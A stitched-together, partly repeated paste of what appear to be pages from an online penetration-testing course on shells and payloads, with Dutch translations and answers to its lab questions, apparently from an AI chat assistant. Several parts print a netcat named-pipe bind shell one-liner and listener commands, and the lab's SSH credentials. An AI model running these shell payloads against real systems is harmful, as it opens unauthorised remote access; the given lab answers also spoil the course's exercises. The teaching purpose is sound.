Aan de slag met Terminal Emulators en Shells

Laten we onze Parrot OS Pwnbox gebruiken om de anatomie van een shell te verkennen.

    Klik op het groene vierkante icoon bovenaan het scherm om de MATE terminal te openen.

    Typ een willekeurige tekst en druk op Enter.

Zodra de terminal opent, zie je een $ teken. Dit symbool wordt in Bash, Ksh en POSIX gebruikt om het begin van de prompt aan te geven waar de gebruiker kan typen. Als je willekeurige tekst typt, krijg je een foutmelding van Bash die aangeeft dat het commando niet wordt herkend. Dit bevestigt welke interpreter actief is.
Shell-validatie via ps

Je kunt de actieve interpreter identificeren door de draaiende processen te bekijken:
Bash

leonwintweer@htb[/htb]$ ps
  PID TTY          TIME CMD
 4232 pts/1    00:00:00 bash
11435 pts/1    00:00:00 ps

Shell-validatie via env

Je kunt ook de omgevingsvariabelen bekijken:
Bash

leonwintweer@htb[/htb]$ env | grep SHELL
SHELL=/bin/bash

PowerShell vs. Bash

Klik nu op het blauwe vierkante icoon in de Pwnbox. Dit opent ook de MATE terminal, maar gebruikt een andere interpreter: PowerShell. Vergelijk de twee schermen. Een terminal emulator is dus niet gebonden aan één specifieke taal; de shell-taal kan worden aangepast aan de voorkeur van de systeembeheerder of pentester.
Vragen

Beantwoord de onderstaande vragen met behulp van de Pwnbox:

    Welke twee shell-talen hebben we in deze sectie uitgeprobeerd? (Formaat: shellnaam&shellnaam)

    Voer in de Pwnbox de variabele $PSversiontable uit in PowerShell. Wat is de editie (Edition) van de PowerShell die momenteel draait?

Hier is de vertaling van de vierde pagina over Bind Shells, inclusief de uitleg over de commando's en de antwoorden op de vragen.
Bind Shells

In veel gevallen werken we aan het verkrijgen van een shell op een systeem in een lokaal of extern netwerk. Dit betekent dat we de terminal emulator op onze eigen aanvalscomputer (attack box) gebruiken om het externe systeem aan te sturen. Dit gebeurt meestal via een Bind Shell of een Reverse Shell.
Wat is het?

Bij een bind shell wordt er op het doelsysteem (target) een "luisteraar" (listener) gestart die wacht op een verbinding van het systeem van de pentester.

Uitdagingen bij een bind shell:

    Er moet al een listener actief zijn op het doelwit (of je moet een manier vinden om deze te starten).

    Firewalls blokkeren vaak inkomende verbindingen (inkomend verkeer is strenger beveiligd dan uitgaand verkeer).

    NAT-configuraties kunnen directe verbindingen van buitenaf bemoeilijken.

De tool bij uitstek hiervoor is Netcat (nc), ook wel het "Zwitserse zakmes" van hackers genoemd.
Oefenen met GNU Netcat

In dit scenario gebruiken we een Ubuntu Linux-systeem.

    Op de Server (Target): Start een listener. nc -lvnp 7777 (Uitleg: l=listen, v=verbose, n=no DNS lookup, p=port)

    Op de Client (Attack Box): Maak verbinding. nc -nv <IP-ADRES-TARGET> 7777

Zodra er verbinding is, kun je tekst over en weer sturen. Dit is echter nog geen echte shell, omdat je nog geen commando's kunt uitvoeren op het besturingssysteem.
Een echte Bind Shell opzetten

Om een echte interactieve shell te krijgen, moeten we een payload gebruiken die de shell van het systeem (bijv. /bin/bash) koppelt aan de Netcat-sessie.

Commando op de server (Target):
Bash

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

    mkfifo /tmp/f: Maakt een "named pipe" aan om data tussen processen te sturen.

    /bin/bash -i: Start een interactieve Bash-shell.

    2>&1: Zorgt dat foutmeldingen ook door de pipe worden gestuurd.

Wanneer je nu vanaf je aanvalscomputer verbinding maakt via nc, krijg je direct een prompt van het doelsysteem te zien!
Vragen & Oplossingen

Vraag 1: Des voert het commando nc -lvnp 443 uit op een Linux-target. Met welke poort moet zij verbinding maken vanaf haar attack box?

    Antwoord: 443 (Uitleg: De vlag -p in het commando geeft aan op welke poort de listener luistert. In dit geval is dat poort 443, de standaardpoort voor HTTPS-verkeer.)

Vraag 2: SSH naar het doelwit, maak een bind shell aan, maak verbinding en verzend de inhoud van flag.txt in /customscripts.

    Stappenplan:

        Log in via SSH: ssh htb-student@<TARGET_IP> (wachtwoord: HTB_@cademy_stdnt!).

        Start de bind shell op het doelwit: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f

        Open een nieuwe terminal op je eigen Pwnbox en maak verbinding: nc -nv <TARGET_IP> 7777

        Zodra je binnen bent, typ: cat /customscripts/flag.txt.

        Kopieer de code die verschijnt en dien deze in.
     vertaal:


Shells & Payloads

 



Page 1

Shells Jack Us In, Payloads Deliver Us Shells







Shells Jack Us In, Payloads Deliver Us Shells


A shell is a program that provides a computer user with

an interface to input instructions into the system and view text output

(Bash, Zsh, cmd, and PowerShell, for example). As penetration testers

and information security professionals, a shell is often the result of

exploiting a vulnerability or bypassing security measures to gain

interactive access to a host. We may have heard or read the following

phrases used by people discussing an engagement or a recent practice

session:


"I caught a shell."

"I popped a shell!"

"I dropped into a shell!"

"I'm in!"

Typically these phrases translate to the understanding that this

person has successfully exploited a vulnerability on a system and has

been able to gain remote control of the shell on the target computer's

operating system. This is a common goal a penetration tester will have

when attempting to access a vulnerable machine. We will notice that most

of this module will focus on what comes after enumeration and

identification of promising exploits.

Why Get a Shell?

Remember that the shell gives us direct access to the OS, system commands, and file system.

So if we gain access, we can start enumerating the system for vectors

that may allow us to escalate privileges, pivot, transfer files, and

more. If we don't establish a shell session, we are pretty limited on

how far we can get on a target machine.

Establishing a shell also allows us to maintain persistence on the

system, giving us more time to work. It can make it easier to use our attack tools, exfiltrate data, gather, store and document

all the details of our attack, as we will soon see in the proceeding

demonstrations. It's important to note that establishing a shell almost

always means we are accessing the CLI of the OS, and this can make us

harder to notice than if we were remotely accessing a graphical shell

over VNC or RDP. Another significant benefit of becoming skilled with command-line interfaces is that they can be harder to detect than graphical shells, faster to navigate the OS, and easier to automate our actions. We view shells through the lens of the following perspectives throughout this module:

PerspectiveDescriptionComputingThe text-based userland environment that is utilized to administer

tasks and submit instructions on a PC. Think Bash, Zsh, cmd, and

PowerShell.Exploitation & SecurityA shell is often the result of exploiting a vulnerability or

bypassing security measures to gain interactive access to a host. An

example would be triggering EternalBlue on a Windows host to gain access to the cmd-prompt on a host remotely.WebThis is a bit different. A web shell is much like a standard shell,

except it exploits a vulnerability (often the ability to upload a file

or script) that provides the attacker with a way to issue instructions,

read and access files, and potentially perform destructive actions to

the underlying host. Control of the web shell is often done by calling

the script within a browser window.

Payloads Deliver us Shells

Within the IT industry as a whole, a payload can be defined in a few different ways:


Networking: The encapsulated data portion of a packet traversing modern computer networks.

Basic Computing: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.

Programming: The data portion referenced or carried by the programming language instruction.

Exploitation & Security: A payload is code

crafted with the intent to exploit a vulnerability on a computer

system. The term payload can describe various types of malware,

including but not limited to ransomware.

In this module, we will be working with many different types of payloads and delivery methods within the context of granting ourselves access to a host and establishing remote shell sessions with vulnerable systems.



Hier is de vertaling van de tekst naar het Nederlands, met behoud van de vakterminologie die in de cybersecurity-wereld gebruikelijk is.
Shells & Payloads

Shells pluggen ons in, Payloads leveren ons Shells
Wat is een Shell?

Een shell is een programma dat een computergebruiker een interface biedt om instructies in het systeem in te voeren en tekstuitvoer te bekijken (bijvoorbeeld Bash, Zsh, cmd en PowerShell). Voor penetratietesters en informatiebeveiligers is een shell vaak het resultaat van het misbruiken van een kwetsbaarheid of het omzeilen van beveiligingsmaatregelen om interactieve toegang tot een host te verkrijgen. Je hebt vast wel eens zinnen gehoord als:

    "Ik heb een shell gevangen." (I caught a shell.)

    "Ik heb een shell gepopt!" (I popped a shell!)

    "Ik ben in een shell gedropt!"

    "Ik ben binnen!"

Meestal betekenen deze uitspraken dat de persoon met succes een kwetsbaarheid op een systeem heeft misbruikt en op afstand controle heeft gekregen over de shell van het besturingssysteem op de doelcomputer. Dit is een veelvoorkomend doel van een penetratietester. Het grootste deel van deze module zal zich richten op wat er gebeurt na de enumeratie en de identificatie van veelbelovende exploits.
Waarom een Shell verkrijgen?

Vergeet niet dat de shell ons directe toegang geeft tot het OS, de systeemcommando's en het bestandssysteem. Zodra we toegang hebben, kunnen we het systeem gaan onderzoeken (enumereren) op vectoren die ons in staat stellen om rechten te escaleren (privilege escalation), door te dringen naar andere systemen (pivoting), bestanden over te dragen en meer. Zonder een shell-sessie zijn we zeer beperkt in hoe ver we kunnen komen op een doelsysteem.

Het opzetten van een shell stelt ons ook in staat om persistence (toegang behouden) op het systeem te verkrijgen, waardoor we meer tijd hebben om te werken. Het maakt het eenvoudiger om onze aanvalstools te gebruiken, gegevens te exfiltreren en alle details van onze aanval te verzamelen en te documenteren.

Belangrijk is dat een shell bijna altijd betekent dat we toegang hebben tot de CLI (Command Line Interface) van het OS. Dit is vaak lastiger op te merken dan wanneer we op afstand een grafische shell via VNC of RDP zouden gebruiken. Bovendien is de CLI sneller in navigatie en makkelijker te automatiseren.
Shell Perspectieven
Perspectief	Beschrijving
Computing	De tekstgebaseerde omgeving die wordt gebruikt om taken te beheren en instructies in te dienen op een pc. Denk aan Bash, Zsh, cmd en PowerShell.
Exploitation & Security	Een shell is vaak het resultaat van het exploiteren van een kwetsbaarheid. Een voorbeeld is het triggeren van EternalBlue op een Windows-host om op afstand toegang te krijgen tot de cmd-prompt.
Web	Een web shell is vergelijkbaar, maar misbruikt een kwetsbaarheid (vaak de mogelijkheid om een bestand of script te uploaden) waardoor de aanvaller instructies kan geven via een browser.
Payloads leveren ons Shells

Binnen de IT-sector kan een 'payload' op verschillende manieren worden gedefinieerd:

    Netwerken: Het ingekapselde datagedeelte van een pakket dat over computernetwerken reist.

    Basisinformatica: Het gedeelte van een instructieset dat de uit te voeren actie definieert (zonder headers en protocolinformatie).

    Programmeren: Het datagedeelte waarnaar wordt verwezen door een instructie in de programmeertaal.

    Exploitation & Security: Een payload is code die is ontwikkeld met de intentie om een kwetsbaarheid op een computersysteem te misbruiken. De term payload kan verschillende soorten malware beschrijven, waaronder ransomware.

In deze module werken we met veel verschillende soorten payloads en leveringsmethoden om toegang te krijgen tot hosts en externe shell-sessies op te zetten met kwetsbare systemen.

Zou je willen dat ik een specifiek deel van de technische termen (zoals pivoting of persistence) verder toelicht?







Dashboard


Modules


Paths


























Shells & Payloads

 



Page 2

CAT5 Security's Engagement Preparation







CAT5 Security's Engagement Preparation

We are a penetration tester working for CAT5 Security, and we are

preparing to perform an engagement for our client, Inlanefreight. The

more senior team members at CAT5 want to see our skills with shells

& payloads before including us in the live engagement.

The final assessment for this module is a series of challenges CAT5

Security created to test our skills. Completing the challenge means you

have passed the evaluation.


Shell basics

Replicate being able to get a bind and reverse shell.

Bind Shell on Linux host.

Reverse Shell on Windows Host.

Payload Basics

Demonstrate launching a payload from MSF.

Demonstrate searching and building a payload from PoC on ExploitDB.

Demonstrate knowledge of payload creation.

Getting a Shell on Windows

Using the recon results provided, craft or use a payload that will exploit the host and provide a shell back.

Getting a Shell on Linux

Using the recon results provided, craft or use a payload to exploit the host and establish a shell session.

Landing a Web Shell

Demonstrate knowledge of web shells and common web applications by

identifying a common web application and its corresponding language.

Using the recon results provided, deploy a payload that will provide shell access from your browser.

Spotting a Shell or Payload

Detect the presence of a payload or interactive shell on a host by analyzing relevant information provided.

Final Challenge

Utilize knowledge gained from the previous sections to select,

craft, and deploy a payload to access the provided hosts. Once a shell

has been acquired, grab the requested information to answer the

challenge questions.






+10 Streak pts





Table of Contents


Introduction

Shell Basics

Payloads

Windows Shells

NIX Shells

Web Shells

Skills Assessment

Additional Considerations

My Workstation


OFFLINE






/ 1 spawns left


















Powered by  








Hier is de vertaling van de voorbereidingspagina voor de opdracht bij CAT5 Security:
Voorbereiding op de opdracht van CAT5 Security

Je bent een penetratietester die werkt voor CAT5 Security, en je bereidt je voor op een opdracht voor onze klant, Inlanefreight. De senior teamleden van CAT5 willen onze vaardigheden met shells & payloads zien voordat ze ons betrekken bij de live opdracht.

De eindbeoordeling van deze module bestaat uit een reeks uitdagingen die CAT5 Security heeft opgezet om onze vaardigheden te testen. Het voltooien van deze uitdagingen betekent dat je bent geslaagd voor de evaluatie.
Onderdelen van de evaluatie:

    Shell-basis:

        Het reproduceren van een Bind Shell op een Linux-host.

        Het reproduceren van een Reverse Shell op een Windows-host.

    Payload-basis:

        Demonstreer het lanceren van een payload vanuit MSF (Metasploit Framework).

        Demonstreer het zoeken naar en bouwen van een payload op basis van een PoC (Proof of Concept) op ExploitDB.

        Demonstreer kennis over het creëren van payloads.

    Een Shell verkrijgen op Windows:

        Gebruik de verstrekte verkenningsresultaten (recon) om een payload te maken of te gebruiken die de host exploiteert en een shell terugstuurt.

    Een Shell verkrijgen op Linux:

        Gebruik de verstrekte verkenningsresultaten om een payload te maken of te gebruiken om de host te exploiteren en een shell-sessie op te zetten.

    Een Web Shell plaatsen:

        Toon kennis aan van web shells en veelvoorkomende webapplicaties door een applicatie en de bijbehorende programmeertaal te identificeren.

        Gebruik de verkenningsresultaten om een payload in te zetten die shell-toegang biedt via je browser.

    Een Shell of Payload detecteren:

        Detecteer de aanwezigheid van een payload of interactieve shell op een host door de verstrekte relevante informatie te analyseren.

    Einduitdaging:

        Gebruik de opgedane kennis uit de vorige secties om een payload te selecteren, te maken en in te zetten om toegang te krijgen tot de geleverde hosts. Zodra een shell is verkregen, verzamel je de gevraagde informatie om de vragen van de uitdaging te beantwoorden.

Inhoudsopgave

    Introductie

    Shell-basis

    Payloads

    Windows Shells

    NIX (*nix/Linux) Shells

    Web Shells

    Vaardigheidstoets (Skills Assessment)

    Aanvullende overwegingen

Zal ik de concepten van een Bind Shell versus een Reverse Shell alvast voor je vergelijken, zodat je goed voorbereid aan de eerste opdracht begint?







Dashboard


Modules


Paths


























Shells & Payloads

 



Page 3

Anatomy of a Shell







Anatomy of a Shell

Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. Here are some of the most common terminal emulators:

Terminal EmulatorOperating SystemWindows TerminalWindowscmderWindowsPuTTYWindowskittyWindows, Linux and MacOSAlacrittyWindows, Linux and MacOSxtermLinuxGNOME TerminalLinuxMATE TerminalLinuxKonsoleLinuxTerminalMacOSiTerm2MacOS

This list is by no means every terminal emulator available, but it

does include some noteworthy ones. Also, because many of these tools are

open-source, we can install them on different operating systems in ways

that may differ from the developers' original intentions. However, that

is a project beyond the scope of this module. Selecting the proper

terminal emulator for the job is primarily a personal and stylistic

preference based on our workflows that develop as we get familiar with

our OS of choice. So don't let anyone make you feel bad for selecting

one option over the other. The terminal emulator we interact with on

targets will essentially be dependant on what exists on the system

natively.

Command Language Interpreters

Much like a human language interpreter will translate spoken or sign language in real-time, a command language interpreter

is a program working to interpret the instructions provided by the user

and issue the tasks to the operating system for processing. So when we

discuss command-line interfaces, we know it is a combination of the

operating system, terminal emulator application, and the command

language interpreter. Many different command language interpreters can

be used, some of which are also called shell scripting languages or Command and Scripting interpreters as defined in the Execution techniques of the MITRE ATT&CK Matrix.

We do not need to be software developers to understand these concepts,

but the more we know, the more success we can have when attempting to

exploit vulnerable systems to gain a shell session.

Understanding the command language interpreter in use on any given

system will also give us an idea of what commands & scripts we

should use. Lets get hands-on with some of these concepts.

Hands-on with Terminal Emulators and Shells

Let's use our Parrot OS Pwnbox to further explore the anatomy of a shell. Click the green square icon at the top of the screen to open the MATE terminal emulator and then type something random and hit enter.


Terminal Example


As soon as we selected the icon, it opened the MATE terminal emulator

application, which has been pre-configured to use a command language

interpreter. In this instance, we are "clued" to what language

interpreter is in use by seeing the $ sign. This $ sign is used in Bash, Ksh, POSIX, and many other shell languages to mark the start of the shell prompt

where the user can begin typing commands and other input. When we typed

out our random text and hit enter, our command language interpreter was

identified. That is Bash telling us that it did not recognize that

command we typed. So here, we can see command language interpreters can

have their own set of commands that they recognize. Another way we can

identify the language interpreter is by viewing the processes running on

the machine. In Linux, we can do this using the following command:


Shell Validation From 'ps'


Anatomy of a Shell



leonwintweer@htb[/htb]$ ps PID TTY TIME CMD

4232 pts/1 00:00:00 bash

11435 pts/1 00:00:00 ps

We can also find out what shell language is in use by viewing the environment variables using the env command:


Shell Validation Using 'env'


Anatomy of a Shell



leonwintweer@htb[/htb]$ envSHELL=/bin/bash

Now let's select the blue square icon at the top of the screen in Pwnbox.


PowerShell vs. Bash


Selecting this icon also opens the MATE terminal application but uses

a different command language interpreter this time around. Compare them

as they are placed side-by-side.


What differences can we identify?

Why would we use one over the other on the same system?

There are countless differences and customizations we could discover.

Try using some commands you know in both and make a mental note of the

differences in output and which commands are recognized. One of the main

points we can take away from this is a terminal emulator is not tied to

one specific language. Actually, the shell language can be changed and

customized to suit the sysadmin, developer, or pentester's personal

preference, workflow, and technical needs.

Now for some challenge questions to test our understanding. All answers can be found utilizing Pwnbox.





/ 1 spawns left









Waiting to

start...



Enable step-by-step solutions for all questions





Questions


Answer the question(s) below

to complete this Section and earn cubes!




+ 0 Which two shell languages did we experiment with in this section? (Format: shellname&shellname)



+10 Streak pts





+ 0 In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.



+10 Streak pts















Table of Contents


Introduction

Shell Basics

Payloads

Windows Shells

NIX Shells

Web Shells

Skills Assessment

Additional Considerations

My Workstation


OFFLINE






/ 1 spawns left


















Powered by  











Hier is de vertaling van de derde pagina over de opbouw van een shell:
Anatomie van een Shell

Elk besturingssysteem heeft een shell. Om hiermee te communiceren, moeten we een applicatie gebruiken die bekendstaat als een terminal emulator. Hier zijn enkele van de meest voorkomende terminal emulators:
Terminal Emulator	Besturingssysteem
Windows Terminal	Windows
cmder	Windows
PuTTY	Windows
Alacritty	Windows, Linux en MacOS
xterm	Linux
GNOME Terminal	Linux
Konsole	Linux
Terminal	MacOS
iTerm2	MacOS

Deze lijst is zeker niet volledig, maar bevat de belangrijkste opties. Omdat veel van deze tools open-source zijn, kunnen ze vaak ook op andere systemen worden geïnstalleerd. De keuze voor een terminal emulator is vooral een kwestie van persoonlijke voorkeur en workflow. Op een doelsysteem ben je echter vaak afhankelijk van wat er standaard (nativief) aanwezig is.
Command Language Interpreters

Net zoals een menselijke tolk gesproken taal of gebarentaal in real-time vertaalt, is een command language interpreter een programma dat de instructies van de gebruiker interpreteert en deze doorgeeft aan het besturingssysteem.

Wanneer we spreken over command-line interfaces, bedoelen we de combinatie van:

    Het besturingssysteem (OS)

    De Terminal Emulator (de applicatie)

    De Command Language Interpreter (de taalverwerker)

Veel van deze interpreters worden ook wel shell scripting talen genoemd. In de MITRE ATT&CK Matrix vallen ze onder de techniek "Command and Scripting Interpreters". Hoe beter je deze talen begrijpt, hoe succesvoller je zult zijn in het exploiteren van systemen.
Aan de slag met Terminal Emulators en Shells

Laten we onze Parrot OS Pwnbox gebruiken om de anatomie van een shell te verkennen.

    Klik op het groene vierkante icoon bovenaan het scherm om de MATE terminal te openen.

    Typ een willekeurige tekst en druk op Enter.

Zodra de terminal opent, zie je een $ teken. Dit symbool wordt in Bash, Ksh en POSIX gebruikt om het begin van de prompt aan te geven waar de gebruiker kan typen. Als je willekeurige tekst typt, krijg je een foutmelding van Bash die aangeeft dat het commando niet wordt herkend. Dit bevestigt welke interpreter actief is.
Shell-validatie via ps

Je kunt de actieve interpreter identificeren door de draaiende processen te bekijken:
Bash

leonwintweer@htb[/htb]$ ps
  PID TTY          TIME CMD
 4232 pts/1    00:00:00 bash
11435 pts/1    00:00:00 ps

Shell-validatie via env

Je kunt ook de omgevingsvariabelen bekijken:
Bash

leonwintweer@htb[/htb]$ env | grep SHELL
SHELL=/bin/bash

PowerShell vs. Bash

Klik nu op het blauwe vierkante icoon in de Pwnbox. Dit opent ook de MATE terminal, maar gebruikt een andere interpreter: PowerShell. Vergelijk de twee schermen. Een terminal emulator is dus niet gebonden aan één specifieke taal; de shell-taal kan worden aangepast aan de voorkeur van de systeembeheerder of pentester.
Vragen

Beantwoord de onderstaande vragen met behulp van de Pwnbox:

    Welke twee shell-talen hebben we in deze sectie uitgeprobeerd? (Formaat: shellnaam&shellnaam)

    Voer in de Pwnbox de variabele $PSversiontable uit in PowerShell. Wat is de editie (Edition) van de PowerShell die momenteel draait?

Zal ik je helpen met het commando om de specifieke editie van PowerShell te achterhalen, of wil je het eerst zelf proberen in de Pwnbox?

ja

Dat is een strak plan! Om de informatie te vinden die je nodig hebt voor de tweede vraag, moet je eerst zorgen dat je in de PowerShell-omgeving zit (het blauwe icoontje).
Het commando

Typ het volgende commando in de PowerShell-terminal:
PowerShell

$PSVersionTable

Waar moet je op letten?

Nadat je op Enter hebt gedrukt, verschijnt er een tabel met verschillende eigenschappen. Zoek in de linker kolom naar PSEdition. De waarde die daarachter staat (in de rechter kolom), is het antwoord dat je zoekt.

Kleine hint voor de eerste vraag: De twee talen die je hebt vergeleken zijn de standaard Linux-shell die je als eerste opende, en de Microsoft-shell die je daarna opende via het blauwe icoontje. Gebruik de namen zoals ze in de tekst staan (bijv. bash&powershell).

Laat je me weten of het is gelukt om de PSEdition uit de tabel te vissen?


Questions


Answer the question(s) below

to complete this Section and earn cubes!




+ 0 Which two shell languages did we experiment with in this section? (Format: shellname&shellname)



+10 Streak pts





+ 0 In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.



+10 Streak pts















Table of Contents


Introduction

Shell Basics

Payloads

Windows Shells

NIX Shells

Web Shells

Skills Assessment

Additional Considerations

My Workstation


OFFLINE






/ 1 spawns left


















Hier zijn de directe antwoorden op basis van de oefeningen in de Pwnbox:
Antwoorden op de vragen

    Vraag 1: Which two shell languages did we experiment with in this section?

        Antwoord: bash&powershell (Uitleg: Dit zijn de twee interpreters die je hebt geopend via het groene icoon (Bash) en het blauwe icoon (PowerShell).)

    Vraag 2: In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.

        Antwoord: Core (Uitleg: Wanneer je $PSVersionTable typt in de PowerShell-terminal op de Linux-gebaseerde Pwnbox, zie je bij de eigenschap PSEdition de waarde Core staan. Dit is de cross-platform versie van PowerShell.)

Ter referentie: Wat je ziet in de terminal

Wanneer je het commando uitvoert, ziet de output er ongeveer zo uit:
Name	Value
PSVersion	7.x.x
PSEdition	Core
GitCommitId	...
OS	Linux ...

Klaar voor de volgende stap? Zal ik je uitleggen hoe een Reverse Shell precies werkt, zodat je begrijpt waarom dit de favoriete methode is van veel aanvallers?







Dashboard


Modules


Paths


























Shells & Payloads

 



Page 4

Bind Shells







Bind Shells

In many cases, we will be working to establish a shell on a system on

a local or remote network. This means we will be looking to use the

terminal emulator application on our local attack box to control the

remote system through its shell. This is typically done by using a Bind &/or Reverse shell.

What Is It?

With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).


Bind Example


As seen in the image, we would connect directly with the IP address and port listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:


There would have to be a listener already started on the target.

If there is no listener started, we would need to find a way to make this happen.

Admins typically configure strict incoming firewall rules and NAT

(with PAT implementation) on the edge of the network (public-facing), so

we would need to be on the internal network already.

Operating system firewalls (on Windows & Linux) will likely

block most incoming connections that aren't associated with trusted

network-based applications.

OS firewalls can be troublesome when establishing a shell since we

need to consider IP addresses, ports, and the tool in use to get our

connection working successfully. In the example above, the application

used to start the listener is called GNU Netcat. Netcat (nc) is considered our Swiss-Army Knife

since it can function over TCP, UDP, and Unix sockets. It's capable of

using IPv4 & IPv6, opening and listening on sockets, operating as a

proxy, and even dealing with text input and output. We would use nc on

the attack box as our client, and the target would be the server.

Let's get a more in-depth understanding of this by practicing with

Netcat and establishing a bind shell connection with a host on the same

network with no restrictions in place.

Practicing with GNU Netcat

First, we need to spawn our attack box or Pwnbox and connect to the

Academy network environment. Then make sure our target is started. In

this scenario, we will be interacting with an Ubuntu Linux system to

understand the nature of a bind shell. To do this, we will be using netcat (nc) on the client and server.

Once connected to the target box with ssh, start a Netcat listener:


No. 1: Server - Target starting Netcat listener


Bind Shells



Target@server:~$ nc -lvnp 7777Listening on [0.0.0.0] (family 0, port 7777)

In this instance, the target will be our server, and the attack box

will be our client. Once we hit enter, the listener is started and

awaiting a connection from the client.

Back on the client (attack box), we will use nc to connect to the listener we started on the server.


No. 2: Client - Attack box connecting to target


Bind Shells



leonwintweer@htb[/htb]$ nc -nv 10.129.41.200 7777Connection to 10.129.41.200 7777 port [tcp/*] succeeded!

Notice how we are using nc on the client and the server. On the

client-side, we specify the server's IP address and the port that we

configured to listen on (7777). Once we successfully connect, we can see a succeeded! message on the client as shown above and a received! message on the server, as seen below.


No. 3: Server - Target receiving connection from client


Bind Shells



Target@server:~$ nc -lvnp 7777Listening on [0.0.0.0] (family 0, port 7777)

Connection from 10.10.14.117 51872 received!

Know that this is not a proper shell. It is just a Netcat TCP session

we have established. We can see its functionality by typing a simple

message on the client-side and viewing it received on the server-side.


No. 4: Client - Attack box sending message Hello Academy


Bind Shells



leonwintweer@htb[/htb]$ nc -nv 10.129.41.200 7777Connection to 10.129.41.200 7777 port [tcp/*] succeeded!

Hello Academy

Once we type the message and hit enter, we will notice the message is received on the server-side.


No. 5: Server - Target receiving Hello Academy message


Bind Shells



Victim@server:~$ nc -lvnp 7777Listening on [0.0.0.0] (family 0, port 7777)

Connection from 10.10.14.117 51914 received!

Hello Academy


Note: When on the academy network (10.129.x.x/16)

we can work with another academy student to connect to their target box

and practice the concepts presented in this module.


Establishing a Basic Bind Shell with Netcat

We have shown that we can use Netcat to send text between the client

and the server, but this is not a bind shell because we cannot interact

with the OS and file system. We are only able to pass text within the

pipe setup by Netcat. Let's use Netcat to serve up our shell to

establish a real bind shell.

On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.


No. 1: Server - Binding a Bash shell to the TCP session


Bind Shells



Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

The commands above are considered our payload, and we delivered this

payload manually. We will notice that the commands and code in our

payloads will differ depending on the host operating system we are

delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.


No. 2: Client - Connecting to bind shell on target


Bind Shells



leonwintweer@htb[/htb]$ nc -nv 10.129.41.200 7777Target@server:~$

We will notice that we have successfully established a bind shell

session with the target. Keep in mind that we had complete control over

both our attack box and the target system in this scenario, which isn't

typical. We worked through these exercises to understand the basics of

the bind shell and how it works without any security controls (NAT

enabled routers, hardware firewalls, Web Application Firewalls, IDS,

IPS, OS firewalls, endpoint protection, authentication mechanisms,

etc...) in place or exploits needed. This fundamental understanding will

be helpful as we get into more challenging situations and realistic

scenarios working with vulnerable systems.

As mentioned earlier in this section, it is also good to remember

that the bind shell is much easier to defend against. Since the

connection will be received incoming, it is more likely to get detected

and blocked by firewalls even if standard ports are used when starting a

listener. There are ways to get around this by using a reverse shell

which we will discuss in the next section.

Now, let's test our understanding of these concepts with some challenge questions.



VPN Servers


Warning: Each

time you "Switch",

your connection keys are regenerated and you must re-download your VPN connection file.


All VM instances associated with the old VPN Server will be terminated when switching to

a new VPN server.


Existing PwnBox instances will automatically switch to the new VPN server.





PROTOCOL




UDP

1337


TCP

443







/ 1 spawns left









Waiting to

start...



Enable step-by-step solutions for all questions





Questions


Answer the question(s) below

to complete this Section and earn cubes!


Target(s):

Click here to spawn the target system!





SSH

to with user "htb-student" and

password "HTB_@cademy_stdnt!"


+ 1

Des is able to issue the command nc -lvnp 443 on a Linux target. What

port will she need to connect to from her attack box to successfully

establish a shell session?



+10 Streak pts





+ 1

SSH to the target, create a bind shell, then use netcat to connect to

the target using the bind shell you set up. When you have completed the

exercise, submit the contents of the flag.txt file located at

/customscripts.



+10 Streak pts















Table of Contents


Introduction

Shell Basics

Payloads

Windows Shells

NIX Shells

Web Shells

Skills Assessment

Additional Considerations

My Workstation


OFFLINE






/ 1 spawns left




























Powered by  








Hier is de vertaling van de vierde pagina over Bind Shells, inclusief de uitleg over de commando's en de antwoorden op de vragen.
Bind Shells

In veel gevallen werken we aan het verkrijgen van een shell op een systeem in een lokaal of extern netwerk. Dit betekent dat we de terminal emulator op onze eigen aanvalscomputer (attack box) gebruiken om het externe systeem aan te sturen. Dit gebeurt meestal via een Bind Shell of een Reverse Shell.
Wat is het?

Bij een bind shell wordt er op het doelsysteem (target) een "luisteraar" (listener) gestart die wacht op een verbinding van het systeem van de pentester.

Uitdagingen bij een bind shell:

    Er moet al een listener actief zijn op het doelwit (of je moet een manier vinden om deze te starten).

    Firewalls blokkeren vaak inkomende verbindingen (inkomend verkeer is strenger beveiligd dan uitgaand verkeer).

    NAT-configuraties kunnen directe verbindingen van buitenaf bemoeilijken.

De tool bij uitstek hiervoor is Netcat (nc), ook wel het "Zwitserse zakmes" van hackers genoemd.
Oefenen met GNU Netcat

In dit scenario gebruiken we een Ubuntu Linux-systeem.

    Op de Server (Target): Start een listener. nc -lvnp 7777 (Uitleg: l=listen, v=verbose, n=no DNS lookup, p=port)

    Op de Client (Attack Box): Maak verbinding. nc -nv <IP-ADRES-TARGET> 7777

Zodra er verbinding is, kun je tekst over en weer sturen. Dit is echter nog geen echte shell, omdat je nog geen commando's kunt uitvoeren op het besturingssysteem.
Een echte Bind Shell opzetten

Om een echte interactieve shell te krijgen, moeten we een payload gebruiken die de shell van het systeem (bijv. /bin/bash) koppelt aan de Netcat-sessie.

Commando op de server (Target):
Bash

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

    mkfifo /tmp/f: Maakt een "named pipe" aan om data tussen processen te sturen.

    /bin/bash -i: Start een interactieve Bash-shell.

    2>&1: Zorgt dat foutmeldingen ook door de pipe worden gestuurd.

Wanneer je nu vanaf je aanvalscomputer verbinding maakt via nc, krijg je direct een prompt van het doelsysteem te zien!
Vragen & Oplossingen

